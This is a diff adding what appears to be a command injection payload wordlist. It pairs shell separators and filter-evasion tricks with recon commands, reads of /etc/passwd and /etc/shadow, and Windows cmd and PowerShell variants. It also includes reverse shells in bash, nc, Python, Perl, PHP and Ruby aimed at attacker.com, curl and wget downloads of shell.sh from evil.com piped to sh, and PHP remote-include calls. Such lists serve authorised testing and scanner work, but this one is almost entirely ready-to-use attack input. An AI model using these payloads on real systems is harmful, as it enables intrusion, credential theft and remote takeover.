@@ -1,0 +1,160 @@
+; ls
+; id
+; whoami
+; pwd
+; cat /etc/passwd
+; cat /etc/shadow
+; uname -a
+; ps aux
+; netstat -an
+; ifconfig
+; ip a
+; hostname
+| ls
+| id
+| whoami
+| pwd
+| cat /etc/passwd
+| uname -a
+& ls
+& id
+& whoami
+&& ls
+&& id
+&& whoami
+&& pwd
+&& cat /etc/passwd
+`ls`
+`id`
+`whoami`
+`pwd`
+`cat /etc/passwd`
+$(ls)
+$(id)
+$(whoami)
+$(pwd)
+$(cat /etc/passwd)
+${IFS}ls
+${IFS}id
+${IFS}whoami
+%0als
+%0aid
+%0awhoami
+%0a/bin/ls
+%0a/usr/bin/id
+;${IFS}ls
+;${IFS}id
+|${IFS}ls
+|${IFS}id
+`ls${IFS}`
+$(ls${IFS})
+; sleep 5
+; ping -c 5 127.0.0.1
+| sleep 5
+| ping -c 5 127.0.0.1
+&& sleep 5
+&& ping -c 5 127.0.0.1
+`sleep 5`
+$(sleep 5)
+;sleep${IFS}5
+|sleep${IFS}5
+; curl http://evil.com/shell.sh | sh
+| curl http://evil.com/shell.sh | sh
+; wget http://evil.com/shell.sh -O /tmp/shell.sh
+| wget http://evil.com/shell.sh -O /tmp/shell.sh
+; nc -e /bin/sh attacker.com 4444
+| nc -e /bin/sh attacker.com 4444
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+| bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+; ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+127.0.0.1; ls
+127.0.0.1 && id
+127.0.0.1 | whoami
+127.0.0.1`id`
+127.0.0.1$(id)
+localhost; ls
+localhost && id
+localhost | whoami
+localhost`id`
+localhost$(id)
+& dir
+&& dir
+| dir
+; dir
+cmd.exe /c dir
+cmd /c dir
+cmd.exe /c type C:\windows\win.ini
+cmd /c type C:\windows\win.ini
+powershell.exe -command "Get-Process"
+powershell -command "Get-Process"
+cmd.exe /c whoami
+cmd /c whoami
+& whoami
+&& whoami
+| whoami
+; whoami
+cmd.exe /c net user
+cmd /c net user
+cmd.exe /c net user administrator password123
+powershell.exe -command "net user"
+powershell -command "net user administrator password123"
+%COMSPEC% /c dir
+%SystemRoot%\system32\cmd.exe /c dir
+${IFS}cat${IFS}/etc/passwd
+cat</etc/passwd
+cat<>/etc/passwd
+cat${IFS}/etc/passwd
+{cat,/etc/passwd}
+{cat,/etc/shadow}
+{wget,http://evil.com/shell.sh}
+x=cat;$x /etc/passwd
+x='cat /etc/passwd';$x
+cat /etc/passwd #
+cat /etc/passwd --
+cat /etc/passwd %00
+cat /etc/passwd\x00
+;cat</etc/passwd
+;{cat,/etc/passwd}
+|{cat,/etc/passwd}
+&&{cat,/etc/passwd}
+;x=cat;$x /etc/passwd
+|x=cat;$x /etc/passwd
+sh -c "cat /etc/passwd"
+bash -c "cat /etc/passwd"
+/bin/sh -c "cat /etc/passwd"
+/bin/bash -c "cat /etc/passwd"
+;sh -c "cat /etc/passwd"
+|sh -c "cat /etc/passwd"
+&&sh -c "cat /etc/passwd"
+;/bin/sh -c "cat /etc/passwd"
+|/bin/sh -c "cat /etc/passwd"
+perl -e 'print "test\n"'
+python -c 'print "test"'
+ruby -e 'puts "test"'
+php -r 'echo "test";'
+node -e 'console.log("test")'
+lua -e 'print("test")'
+;perl -e 'print "test\n"'
+|python -c 'print "test"'
+&&ruby -e 'puts "test"'
+`perl -e 'print "test\n"'`
+$(python -c 'print "test"')
+eval("ls")
+exec("ls")
+system("ls")
+passthru("ls")
+shell_exec("ls")
+popen("ls")
+proc_open("ls")
+pcntl_exec("ls")
+assert("ls")
+preg_replace('/.*/e','system("ls")',0)
+create_function('','system("ls");')
+include("http://evil.com/shell.txt")
+require("http://evil.com/shell.txt")
+file_get_contents("http://evil.com/shell.txt")
+fopen("http://evil.com/shell.txt","r")
+readfile("http://evil.com/shell.txt")
